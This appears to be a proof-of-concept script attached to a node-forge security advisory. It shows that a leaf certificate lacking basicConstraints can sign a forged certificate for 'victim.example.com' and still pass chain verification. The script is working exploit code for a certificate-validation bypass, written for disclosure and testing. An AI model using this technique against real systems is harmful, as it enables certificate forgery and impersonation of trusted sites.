// Security Advisory PoC
//
// https://github.com/digitalbazaar/forge/security/advisories/GHSA-2328-f5f3-gj25
//
// Doruk Tan Ozturk (@peaktwilight) - doruk.ch

const forge = require('../..');
const pki = forge.pki;

function generateKeyPair() {
  return pki.rsa.generateKeyPair({ bits: 2048, e: 0x10001 });
}

console.log('=== node-forge basicConstraints Bypass PoC ===\n');

// 1. Create a legitimate Root CA (self-signed, with basicConstraints cA=true)
const rootKeys = generateKeyPair();
const rootCert = pki.createCertificate();
rootCert.publicKey = rootKeys.publicKey;
rootCert.serialNumber = '01';
rootCert.validity.notBefore = new Date();
rootCert.validity.notAfter = new Date();
rootCert.validity.notAfter.setFullYear(rootCert.validity.notBefore.getFullYear() + 10);

const rootAttrs = [
  { name: 'commonName', value: 'Legitimate Root CA' },
  { name: 'organizationName', value: 'PoC Security Test' }
];
rootCert.setSubject(rootAttrs);
rootCert.setIssuer(rootAttrs);
rootCert.setExtensions([
  { name: 'basicConstraints', cA: true, critical: true },
  { name: 'keyUsage', keyCertSign: true, cRLSign: true, critical: true }
]);
rootCert.sign(rootKeys.privateKey, forge.md.sha256.create());

// 2. Create a "leaf" certificate signed by root — NO basicConstraints, NO keyUsage
//    This certificate should NOT be allowed to sign other certificates
const leafKeys = generateKeyPair();
const leafCert = pki.createCertificate();
leafCert.publicKey = leafKeys.publicKey;
leafCert.serialNumber = '02';
leafCert.validity.notBefore = new Date();
leafCert.validity.notAfter = new Date();
leafCert.validity.notAfter.setFullYear(leafCert.validity.notBefore.getFullYear() + 5);

const leafAttrs = [
  { name: 'commonName', value: 'Non-CA Leaf Certificate' },
  { name: 'organizationName', value: 'PoC Security Test' }
];
leafCert.setSubject(leafAttrs);
leafCert.setIssuer(rootAttrs);
// NO basicConstraints extension — NO keyUsage extension
leafCert.sign(rootKeys.privateKey, forge.md.sha256.create());

// 3. Create a "victim" certificate signed by the leaf
//    This simulates an attacker using a non-CA cert to forge certificates
const victimKeys = generateKeyPair();
const victimCert = pki.createCertificate();
victimCert.publicKey = victimKeys.publicKey;
victimCert.serialNumber = '03';
victimCert.validity.notBefore = new Date();
victimCert.validity.notAfter = new Date();
victimCert.validity.notAfter.setFullYear(victimCert.validity.notBefore.getFullYear() + 1);

const victimAttrs = [
  { name: 'commonName', value: 'victim.example.com' },
  { name: 'organizationName', value: 'Victim Corp' }
];
victimCert.setSubject(victimAttrs);
victimCert.setIssuer(leafAttrs);
victimCert.sign(leafKeys.privateKey, forge.md.sha256.create());

// 4. Verify the chain: root -> leaf -> victim
const caStore = pki.createCaStore([rootCert]);

try {
  const result = pki.verifyCertificateChain(caStore, [victimCert, leafCert]);
  //const result = pki.verifyCertificateChain(caStore, [leafCert, victimCert]);
  console.log('[VULNERABLE] Chain verification SUCCEEDED: ' + result);
  console.log('  node-forge accepted a non-CA certificate as an intermediate CA!');
  console.log('  This violates RFC 5280 Section 6.1.4.');
} catch (e) {
  console.log('[SECURE] Chain verification FAILED (expected): ' + e.message);
}
